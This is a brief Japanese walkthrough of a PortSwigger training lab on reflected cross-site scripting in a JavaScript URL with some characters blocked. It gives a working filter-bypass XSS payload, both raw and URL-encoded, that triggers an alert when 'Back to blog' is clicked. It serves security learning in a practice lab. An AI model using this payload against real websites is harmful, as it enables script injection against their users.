# 一部の文字がブロックされた URL に XSS を反映

以下のハッキングラボを実施します  
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked

- 1. ハッキングラボにアクセスします
- 2. 任意のブログにアクセスします
- 3. 以下スクリプトを URL エンコーディングします

```js
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

- 4. URL の後ろに以下のエンコーディングしたスクリプトを付加します

```
%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```

- 5. 画面下部の Back to blog を押すとアラートが表示され、スクリプト実行が確認できます
